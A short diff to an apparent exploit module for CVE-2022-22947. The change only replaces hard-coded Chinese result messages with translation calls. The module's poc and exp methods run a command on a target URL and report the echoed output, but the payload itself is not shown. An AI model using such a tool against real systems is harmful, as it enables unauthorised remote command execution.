@@ -4,6 +4,7 @@ import json
 import requests
 
 from util import RandomUA
+from util.Translate import tr
 
 class CVE_2022_22947:
     def __init__(self):
@@ -59,14 +60,14 @@ class CVE_2022_22947:
 
             # if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             if re5.status_code == 200:
-                reslut = f"[+] {url} Payload已经输出，回显结果如下"
+                reslut = tr("v.22947.out", url=url)
                 reslut1 =re3.text.encode("utf-8").decode("unicode_escape") + "\n"
                 return reslut + reslut1
             else:
-                reslut = f"[-] {url} CVE-2022-22947漏洞不存在"
+                reslut = tr("v.22947.none", url=url)
                 return reslut
         except Exception as e:
-            error = f"[error] {url} 未知错误 {e}"
+            error = tr("v.unknown", url=url, e=e)
             return error
     def exp(self,url,proxies,ProxyStute,cmd):
         result = self.poc(url,proxies,ProxyStute,cmd)
